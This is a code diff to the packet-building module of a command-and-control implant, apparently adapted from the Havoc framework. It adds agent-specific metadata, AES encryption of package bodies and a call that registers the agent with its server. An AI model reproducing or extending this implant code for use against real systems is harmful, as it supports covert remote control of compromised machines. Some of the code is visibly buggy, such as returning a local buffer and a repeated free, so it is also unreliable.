@@ -1,5 +1,7 @@
 #include "package.h"
+#include "localcstd.h"
 
+#include "Http.h"
 /*
 	This section is almost a 1 for 1 of the code from havoc package. I'll try to make edits where I can. But I thought  the solution was very elegant so i wanted to adopt it.
 */
@@ -10,7 +12,7 @@ pPackage CreatePackage(UINT32 CommandID) {
 	//allocate the pointer to memory location for the total package.
 	pack = LocalAlloc(LPTR, sizeof(Package));
 	//allocate the pointer to the memory location for the package's data buffer.
-	pack->Buffer = localAlloc(LPTR, sizeof(BYTE));
+	pack->Buffer = LocalAlloc(LPTR, sizeof(BYTE));
 	//set data buffer length to 0.
 	pack->Length = 0;
 	//set request identifier to 1 (first request).
@@ -27,19 +29,31 @@ pPackage CreatePackage(UINT32 CommandID) {
 	return pack;
 }
 
-pPackage CreatePackageWithMetaData(UINT32 CommandID) {
+pPackage CreatePackageWithMetaData(UINT32 CommandID, pAgent Agent) {
 	pPackage pack = CreatePackage(CommandID);
 	int err = 0;
 
 	if ((err = AddInt32ToPackage(pack, 0)) != PACKAGE_SUCCESS) { //Setting the first four bytes of buffer to 0. This will allow us to put the length field in later @ beginning of buffer.
-																 //could also probably do this using the last four bytes of the buffer as well.
-		printf("[error] attempting to add four bytes to package. %s\n", ErrorToString(err));
+		//could also probably do this using the last four bytes of the buffer as well.
+		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
 		return NULL;
 	}
-	AddInt32ToPackage(pack, AGENT_MAGIC_VALUE);
-	AddInt32ToPackage(pack, g_ImplantData.AgentID);
-	AddInt32ToPackage(pack, pack->CommandID);
-	AddInt32ToPackage(pack, pack->RequestID);
+	if ((err = AddInt32ToPackage(pack, AGENT_MAGIC_VALUE)) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
+		return NULL;
+	}
+	if ((err = AddInt32ToPackage(pack, Agent->AgentID)) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
+		return NULL;
+	}
+	if ((err = AddInt32ToPackage(pack, pack->CommandID)) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
+		return NULL;
+	}
+	if ((err = AddInt32ToPackage(pack, pack->RequestID)) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to add four bytes to package. %s\n", PackageErrorToString(err));
+		return NULL;
+	}
 
 	return pack;
 }
@@ -234,8 +248,8 @@ INT AddWStringToPackage(pPackage pack, PWCHAR data) {
 	return AddBytesToPackage(pack, (PBYTE)data, StringLengthW(data) * 2);
 }
 
-INT DestroyPackage(pPackage pack) {
-	pPackage pkg = g_ImplantData.packages;
+INT DestroyPackage(pPackage pack, pAgent agent) {
+	pPackage pkg = agent->packages;
 
 	if (!pack)
 		return PACKAGE_DOES_NOT_EXIST;
@@ -251,51 +265,50 @@ INT DestroyPackage(pPackage pack) {
 	if (!pack->Buffer)
 		return PACKAGE_BUFFER_DOES_NOT_EXIST;
 
-	SetMemory(pack->Buffer, 0, pack->Length);
+	MemorySet(pack->Buffer, 0, pack->Length);
 	LocalFree(pack->Buffer);
 	pack->Buffer = NULL;
 
-	SetMemory(pack->Buffer, 0, pack->Length);
+	MemorySet(pack->Buffer, 0, pack->Length);
 	LocalFree(pack->Buffer);
 	pack->Buffer = NULL;
 
 	return PACKAGE_SUCCESS;
 }
 
-LPSTR ErrorToString(INT error) {
-	LPSTR error[100];
+LPSTR PackageErrorToString(INT error) {
+	LPSTR errorstr[100];
 	switch (error)
 	{
 	case   PACKAGE_FALIURE_GENERIC:
-		sprintf_s(error,sizeof(error), "GENERIC PACKAGE FAILURE\n");
+		sprintf_s(errorstr,sizeof(errorstr), "GENERIC PACKAGE FAILURE\n");
 		break;
 	case PACKAGE_DOES_NOT_EXIST:
-		sprintf_s(error, sizeof(error), "PACKAGE_DOES_NOT_EXIST\n");
+		sprintf_s(errorstr, sizeof(errorstr), "PACKAGE_DOES_NOT_EXIST\n");
 		break;
 	case PACKAGE_DATA_DOES_NOT_EXIST:
-		sprintf_s(error, sizeof(error), "PACKAGE_DATA_DOES_NOT_EXIST\n");
+		sprintf_s(errorstr, sizeof(errorstr), "PACKAGE_DATA_DOES_NOT_EXIST\n");
 		break;
 	case PACKAGE_UNEXPECTED_DATA_SIZE:
-		sprintf_s(error, sizeof(error), "PACKAGE_UNEXPECTED_DATA_SIZE\n");
+		sprintf_s(errorstr, sizeof(errorstr), "PACKAGE_UNEXPECTED_DATA_SIZE\n");
 		break;
 	case PACKAGE_BUFFER_REALLOC_FAILED:
-		sprintf_s(error, sizeof(error), "PACKAGE_BUFFER_REALLOC_FAILED\n");
+		sprintf_s(errorstr, sizeof(errorstr), "PACKAGE_BUFFER_REALLOC_FAILED\n");
 		break;
 	case PACKAGE_BUFFER_DOES_NOT_EXIST:
-		sprintf_s(error, sizeof(error), "PACKAGE_BUFFER_DOES_NOT_EXIST\n");
+		sprintf_s(errorstr, sizeof(errorstr), "PACKAGE_BUFFER_DOES_NOT_EXIST\n");
 		break;
 	case PACKAGE_POINTER_DOES_NOT_EXIST:
-		sprintf_s(error, sizeof(error), "PACKAGE_POINTER_DOES_NOT_EXIST\n");
+		sprintf_s(errorstr, sizeof(errorstr), "PACKAGE_POINTER_DOES_NOT_EXIST\n");
 		break;
 	case PACKAGE_HAS_NOT_BEEN_SENT_TO_SERVER:
-		sprintf_s(error, sizeof(error), "PACKAGE_HAS_NOT_BEEN_SENT_TO_SERVER\n");
+		sprintf_s(errorstr, sizeof(errorstr), "PACKAGE_HAS_NOT_BEEN_SENT_TO_SERVER\n");
 		break;
 	}
-	return error;
+	return errorstr;
 }
 
-INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize) {
-	UINT32 padding = 0;
+INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize, pAgent Agent) {
 
 	if (!pack)
 		return PACKAGE_DOES_NOT_EXIST;
@@ -303,20 +316,41 @@ INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize) {
 	if (!pack->Buffer)
 		return PACKAGE_BUFFER_DOES_NOT_EXIST;
 
-	AddInt32ToBuffer(pack->Buffer, pack->Length - sizeof(UINT32));
+	AddInt32ToBuffer(pack->Buffer, pack->Length); // add the length of the buffer to the front of buffer in empty space created when calling create metadata package.
 
 	if (pack->Encrypt)
 	{
-		padding += (sizeof(UINT64) * 2) + 4; //rewrite of the havoc padding code.
 
-		if (pack->CommandID == INITIALIZE_AGENT) {
-			padding += 32 + 16;
-		}
-
+		INT err;
 		//TODO perform encryption.
+		if ((err = AESEncrypt(
+			(BYTE*)pack->Buffer + (PACKAGE_HEADER_LENGTH + sizeof(UINT32) + Agent->EncryptedAESKeySize + sizeof(UINT32) + Agent->EncryptedIVSize),	//buffer to encrypt. BUFF START + HEADERS + ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV
+			pack->Length - (PACKAGE_HEADER_LENGTH + sizeof(UINT32) + Agent->EncryptedAESKeySize + sizeof(UINT32) + Agent->EncryptedIVSize),			//SIZE OF BUFFER TO ENCRYPT. BUFFER LEN - HEADERS - (ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV)
+			Agent)																																	//agent pointer
+			) != CRYPT_OK) {
+			return err;
+		}
 	}
 
 	//TODO perform sending of package.
+	RegisterAgent(Agent, Agent->packages->Buffer, Agent->packages->Length);
+
 
 	return PACKAGE_SUCCESS;
+} 
+
+void AddPackageToAgentPackageList(pAgent agent, pPackage pack) {
+	if (agent->packages == NULL)
+	{
+		agent->packages = pack;
+		return;
+	}
+	else {
+		pPackage temp;
+		temp = agent->packages;
+		while (temp->Next != NULL) {
+			temp = temp->Next;
+		}
+		temp->Next = pack;
+	}
 }
